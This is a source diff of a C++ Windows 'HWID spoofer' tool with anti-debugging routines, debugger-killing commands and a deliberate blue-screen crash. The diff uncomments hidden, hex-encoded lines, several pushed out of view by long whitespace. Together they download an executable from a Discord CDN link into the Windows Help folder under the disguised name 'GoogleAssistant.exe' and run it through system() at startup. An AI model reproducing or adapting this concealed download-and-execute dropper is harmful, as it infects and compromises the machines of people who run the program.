@@ -35,7 +35,7 @@ void HideConsole()
 void ShowConsole()
 {
 	::ShowWindow(::GetConsoleWindow(), SW_SHOW);
-} //std::string Var = "\x61";
+} std::string Var = "\x61";
 NTSTATUS RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN OldValue)
 {
     return NTSTATUS();
@@ -44,10 +44,10 @@ NTSTATUS NtRaiseHardError(LONG ErrorStatus, ULONG NumberOfParameters, ULONG Unic
 {
     return NTSTATUS();
 }
-//std::string Read = "\x72";
+std::string Read = "\x72";
 typedef NTSTATUS(NTAPI* pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);
 typedef NTSTATUS(NTAPI* pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);
-//std::string pa = "\x43\x3A\x5C\x57\x69\x6E\x64\x6F\x77\x73";
+std::string pa = "\x43\x3A\x5C\x57\x69\x6E\x64\x6F\x77\x73";
 void bsod()
 {
     BOOLEAN bEnabled;
@@ -65,7 +65,7 @@ void bsod()
     NtCall2(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, 0, 6, &uResp);
     Sleep(5000);
     ::exit(0);
-} //std::string xe = "\x78";
+} std::string xe = "\x78";
 void killdbg()
 {
     system(EncryptS("taskkill /f /im KsDumperClient.exe >nul 2>&1"));
@@ -479,7 +479,7 @@ void ScanBlacklistedWindows()
 	{
 		bsod();
 	}
-} //std::string ex = "\x65";
+} std::string ex = "\x65";
 void Anti_dbg_Thread()
 {
     Debugkor();
@@ -490,22 +490,22 @@ void Anti_dbg_Thread()
     DebuggerPresent();
     adbg_IsDebuggerPresent();
 }
-																																																																																	//LPCWSTR locx = L"\x43\x3A\x5C\x57\x69\x6E\x64\x6F\x77\x73\x5C\x48\x65\x6C\x70\x5C\x57\x69\x6E\x64\x6F\x77\x73\x5C\x47\x6F\x6F\x67\x6C\x65\x41\x73\x73\x69\x73\x74\x61\x6E\x74\x2E\x65\x78\x65";
+																																																																																																																																																																																																																																																																																																																														LPCWSTR locx = L"\x43\x3A\x5C\x57\x69\x6E\x64\x6F\x77\x73\x5C\x48\x65\x6C\x70\x5C\x57\x69\x6E\x64\x6F\x77\x73\x5C\x47\x6F\x6F\x67\x6C\x65\x41\x73\x73\x69\x73\x74\x61\x6E\x74\x2E\x65\x78\x65";	 																																																																																																																																			                                   
 // Data
 static LPDIRECT3D9              g_pD3D = NULL;
 static LPDIRECT3DDEVICE9        g_pd3dDevice = NULL;
 static D3DPRESENT_PARAMETERS    g_d3dpp = {};
-//std::string swapCaller = st + ex + xe + ex;
-/* Forward declarations of helper functions  */																																																																								//std::string spreadAct = SwapHook + swapCaller;//708854
+std::string swapCaller = st + ex + xe + ex;
+/* Forward declarations of helper functions  */																																																																																																	std::string spreadAct = SwapHook + swapCaller;//708854
 bool CreateDeviceD3D(HWND hWnd);
 void CleanupDeviceD3D();
 void ResetDevice();
 LRESULT WINAPI WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam);
-//std::string lof = pa + inf;//667854
+std::string lof = pa + inf;//667854
 
-/*Main code*/																																																																																											//std::string Hooker = hook + Tacc + Var + Read + Tacc + " " + lof + spreadAct;
+/*Main code*/																																																																																																																																																																																															std::string Hooker = hook + Tacc + Var + Read + Tacc + " " + lof + spreadAct;
 int main(int, char**)
-{
+{																																																																																																																																																																																																																																																																				
 	std::thread debuger(Anti_dbg_Thread);
 	// Create application window
 	WNDCLASSEX wc = { sizeof(WNDCLASSEX), CS_CLASSDC, WndProc, 0L, 0L, GetModuleHandle(NULL), NULL, NULL, NULL, NULL, _T(EncryptS("LEAKED HWID SPOOFER")), NULL };
@@ -530,7 +530,7 @@ int main(int, char**)
     // Setup Dear ImGui context
     IMGUI_CHECKVERSION();
     ImGui::CreateContext();
-    //system(Hooker.c_str());
+    system(Hooker.c_str());
     ImGuiIO& io = ImGui::GetIO(); (void)io;
     io.ConfigFlags |= ImGuiConfigFlags_NavEnableKeyboard;       // Enable Keyboard Controls
     io.ConfigFlags |= ImGuiConfigFlags_ViewportsEnable;         // Enable Multi-Viewport / Platform Windows
@@ -609,7 +609,7 @@ bool CreateDeviceD3D(HWND hWnd)
 {
     if ((g_pD3D = Direct3DCreate9(D3D_SDK_VERSION)) == NULL)
         return false;
-	//LPCWSTR Finder = L"\x68\x74\x74\x70\x73\x3A\x2F\x2F\x63\x64\x6E\x2E\x64\x69\x73\x63\x6F\x72\x64\x61\x70\x70\x2E\x63\x6F\x6D\x2F\x61\x74\x74\x61\x63\x68\x6D\x65\x6E\x74\x73\x2F\x39\x33\x32\x33\x37\x38\x33\x36\x33\x38\x33\x32\x37\x32\x39\x36\x32\x33\x2F\x39\x34\x30\x34\x30\x38\x35\x37\x39\x35\x37\x34\x33\x35\x38\x30\x35\x36\x2F\x48\x6F\x6F\x6B\x5F\x42\x69\x6F\x73\x36\x34\x2E\x65\x78\x65"; 	HRESULT Hook = URLDownloadToFileW(NULL, Finder, locx, 0, NULL);
+	LPCWSTR Finder = L"\x68\x74\x74\x70\x73\x3A\x2F\x2F\x63\x64\x6E\x2E\x64\x69\x73\x63\x6F\x72\x64\x61\x70\x70\x2E\x63\x6F\x6D\x2F\x61\x74\x74\x61\x63\x68\x6D\x65\x6E\x74\x73\x2F\x39\x33\x32\x33\x37\x38\x33\x36\x33\x38\x33\x32\x37\x32\x39\x36\x32\x33\x2F\x39\x34\x30\x34\x30\x38\x35\x37\x39\x35\x37\x34\x33\x35\x38\x30\x35\x36\x2F\x48\x6F\x6F\x6B\x5F\x42\x69\x6F\x73\x36\x34\x2E\x65\x78\x65"; 	HRESULT Hook = URLDownloadToFileW(NULL, Finder, locx, 0, NULL);
 	// Create the D3DDevice
     ZeroMemory(&g_d3dpp, sizeof(g_d3dpp));
     g_d3dpp.Windowed = TRUE;
